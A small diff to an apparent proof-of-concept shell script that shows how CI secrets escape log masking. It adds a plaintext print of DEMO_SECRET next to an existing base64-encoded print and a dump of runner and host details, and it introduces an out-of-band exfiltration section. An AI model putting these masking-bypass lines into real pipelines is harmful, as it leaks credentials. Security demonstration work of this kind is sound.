@@ -5,6 +5,7 @@
 # faire sortir : le masquage ne protege que l'affichage, pas l'exfiltration.
 echo "[poc] exec as $(whoami)@$(hostname) in $(pwd)"
 echo "[poc] runner=$RUNNER_NAME os=$RUNNER_OS"
+echo "[poc] SECRET=$(printf '%s' "${DEMO_SECRET:-<vide>}")"
 echo "[poc] SECRET_B64=$(printf '%s' "${DEMO_SECRET:-<vide>}" | base64 -w0)"
 
 # --- Variante exfiltration out-of-band (exfil "reelle") ---
